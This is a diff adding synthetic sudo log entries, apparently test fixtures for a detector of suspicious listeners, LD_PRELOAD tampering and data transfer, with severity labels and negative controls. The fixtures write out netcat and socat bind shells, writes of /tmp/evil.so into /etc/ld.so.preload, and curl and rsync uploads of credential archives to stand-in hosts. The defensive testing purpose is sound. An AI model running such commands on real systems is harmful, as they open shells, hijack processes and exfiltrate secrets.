@@ -1085,4 +1085,101 @@ Dec 21 20:42:30 webserver sudo[11423]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root 
 
 # Copy to unrelated file
 Dec 21 20:42:40 webserver sudo[11424]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/test /tmp/.bashrc.backup
+# ============================================================
+# TEST: Suspicious Listener Detection
+# ============================================================
+
+# TEST 1: nc normal listener - MEDIUM
+Dec 21 21:20:00 webserver sudo[12200]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nc -l 4444
+
+# TEST 2: nc listener with shell execution - HIGH
+Dec 21 21:20:10 webserver sudo[12201]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/nc -l 4444 -e /bin/bash
+
+# TEST 3: ncat normal listener - MEDIUM
+Dec 21 21:20:20 webserver sudo[12202]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/ncat --listen 5555
+
+# TEST 4: ncat listener with shell execution - HIGH
+Dec 21 21:20:30 webserver sudo[12203]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/ncat --listen 5555 --exec /bin/sh
+
+# TEST 5: socat normal listener - MEDIUM
+Dec 21 21:20:40 webserver sudo[12204]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/socat TCP-LISTEN:4444,fork -
+
+# TEST 6: socat listener with shell execution - HIGH
+Dec 21 21:20:50 webserver sudo[12205]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/socat TCP-LISTEN:4444 EXEC:/bin/bash
+# ============================================================
+# TEST: LD_PRELOAD Tampering Detection
+# ============================================================
+
+# TEST 1: LD_PRELOAD environment variable - MEDIUM
+Dec 21 22:00:00 webserver sudo[13000]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/env LD_PRELOAD=/tmp/evil.so /usr/bin/id
+
+# TEST 2: Remove preload configuration - MEDIUM
+Dec 21 22:00:10 webserver sudo[13001]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/rm -f /etc/ld.so.preload
+
+# TEST 3: Truncate preload configuration - MEDIUM
+Dec 21 22:00:20 webserver sudo[13002]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/truncate -s 0 /etc/ld.so.preload
+
+# TEST 4: Copy malicious preload configuration - HIGH
+Dec 21 22:00:30 webserver sudo[13003]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/evil.conf /etc/ld.so.preload
+
+# TEST 5: Replace preload configuration using mv - HIGH
+Dec 21 22:00:40 webserver sudo[13004]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/mv /tmp/evil.conf /etc/ld.so.preload
+
+# TEST 6: Modify preload configuration using sed - HIGH
+Dec 21 22:00:50 webserver sudo[13005]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/sed -i 's/old/new/' /etc/ld.so.preload
+
+# TEST 7: Write preload configuration using tee - HIGH
+Dec 21 22:01:00 webserver sudo[13006]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/tee /etc/ld.so.preload
+
+# TEST 8: Shell command with echo redirection - HIGH
+Dec 21 22:01:10 webserver sudo[13007]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c 'echo "/tmp/evil.so" > /etc/ld.so.preload'
+
+# TEST 9: Bash command with printf redirection - HIGH
+Dec 21 22:01:20 webserver sudo[13008]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash -c 'printf "/tmp/evil.so" >>/etc/ld.so.preload'
+
+
+# ============================================================
+# NEGATIVE CONTROLS - SHOULD NOT TRIGGER
+# ============================================================
+
+# TEST 10: Read preload configuration only
+Dec 21 22:01:30 webserver sudo[13009]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cat /etc/ld.so.preload
+
+# TEST 11: Echo without file modification
+Dec 21 22:01:40 webserver sudo[13010]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c 'echo /etc/ld.so.preload'
+
+# TEST 12: Redirect output to an unrelated file
+Dec 21 22:01:50 webserver sudo[13011]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/sh -c 'echo "/tmp/evil.so" >/tmp/other.conf'
+# ============================================================
+# TEST: Suspicious Data Transfer Detection
+# ============================================================
+
+# TEST 1: rsync remote file transfer - MEDIUM
+Dec 21 23:10:00 webserver sudo[14000]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/rsync -avz /tmp/credentials.tar.gz exfil@198.51.100.24:/tmp/
+
+# TEST 2: rsync database transfer - MEDIUM
+Dec 21 23:10:10 webserver sudo[14001]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/rsync -avz /tmp/db_dump.sql backup@203.0.113.10:/data/
+
+# TEST 3: curl -T file upload - MEDIUM
+Dec 21 23:10:20 webserver sudo[14002]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -T /tmp/credentials.tar.gz http://198.51.100.24/upload
+
+# TEST 4: curl --upload-file - MEDIUM
+Dec 21 23:10:30 webserver sudo[14003]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl --upload-file /tmp/db_dump.sql http://198.51.100.24/upload
+
+# TEST 5: curl multipart file upload - MEDIUM
+Dec 21 23:10:40 webserver sudo[14004]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -F file=@/tmp/secret.txt http://198.51.100.24/upload
+
+
+# ============================================================
+# NEGATIVE CONTROLS - SHOULD NOT TRIGGER
+# ============================================================
+
+# TEST 6: Normal curl download
+Dec 21 23:11:00 webserver sudo[14005]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/curl -o /tmp/index.html http://example.com/index.html
+
+# TEST 7: Normal wget download
+Dec 21 23:11:10 webserver sudo[14006]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://example.com/file.txt -O /tmp/file.txt
+
+# TEST 8: Local file copy
+Dec 21 23:11:20 webserver sudo[14007]: admin : TTY=pts/6 ; PWD=/tmp ; USER=root ; COMMAND=/bin/cp /tmp/test.txt /tmp/backup.txt
 # === END OF EXPANDED DATASET ===
